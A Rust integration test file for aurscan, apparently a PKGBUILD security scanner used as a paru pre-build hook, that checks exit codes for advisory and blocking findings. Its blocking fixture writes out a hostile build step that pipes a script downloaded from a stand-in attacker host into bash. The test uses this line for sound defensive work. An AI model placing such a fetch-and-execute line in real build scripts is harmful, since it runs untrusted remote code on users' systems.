//! The paru `PreBuildCommand` contract, end to end: paru runs
//! `aurscan check --hook .` in the clone directory and aborts the build on
//! any non-zero exit. So through the compiled binary: an Advisory package
//! must exit 0 under `--hook` (and 1 without it), and a Block must exit 2
//! either way. The harness has no tty, which exercises the unattended
//! branch; the interactive y/N prompt is tty-gated inside
//! `gate::hook_exit_code`.

use std::process::Command;

/// Run the compiled binary's `check` on `dir`, isolated from the developer's
/// real config and cache, with or without `--hook`.
fn check_exit(dir: &std::path::Path, hook: bool) -> i32 {
    let home = tempfile::tempdir().expect("tempdir");
    let mut args = vec!["--no-color", "check"];
    if hook {
        args.insert(2, "--hook");
    }
    let output = Command::new(env!("CARGO_BIN_EXE_aurscan"))
        .args(&args)
        .arg(dir)
        .env("HOME", home.path())
        .env("XDG_CACHE_HOME", home.path().join("cache"))
        .env("XDG_CONFIG_HOME", home.path().join("config"))
        .env("XDG_DATA_HOME", home.path().join("data"))
        .output()
        .expect("failed to launch aurscan binary");
    output.status.code().unwrap_or(-1)
}

/// A PKGBUILD whose only finding is Advisory-level: eval of a command
/// substitution in package(), the shape that aborted a real `paru -Syyu`
/// at tilt-bin.
fn advisory_fixture() -> (tempfile::TempDir, std::path::PathBuf) {
    let dir = tempfile::tempdir().expect("tempdir");
    std::fs::write(
        dir.path().join("PKGBUILD"),
        "pkgname=adv\npkgver=1\npkgrel=1\narch=('x86_64')\n\
         package() {\n  eval \"$(generate-completions)\"\n}\n",
    )
    .unwrap();
    let path = dir.path().to_path_buf();
    (dir, path)
}

#[test]
fn advisory_exits_zero_under_hook_but_one_without() {
    let (_keep, dir) = advisory_fixture();
    assert_eq!(
        check_exit(&dir, false),
        1,
        "plain `check` keeps the documented exit contract (advisory = 1)"
    );
    assert_eq!(
        check_exit(&dir, true),
        0,
        "`check --hook` must not make paru abort a build over an advisory"
    );
}

#[test]
fn block_exits_two_under_hook() {
    let dir = tempfile::tempdir().expect("tempdir");
    std::fs::write(
        dir.path().join("PKGBUILD"),
        "pkgname=evil\npkgver=1\npkgrel=1\narch=('x86_64')\n\
         build() {\n  curl -s https://evil.example/x.sh | bash\n}\n",
    )
    .unwrap();
    assert_eq!(check_exit(dir.path(), true), 2);
}
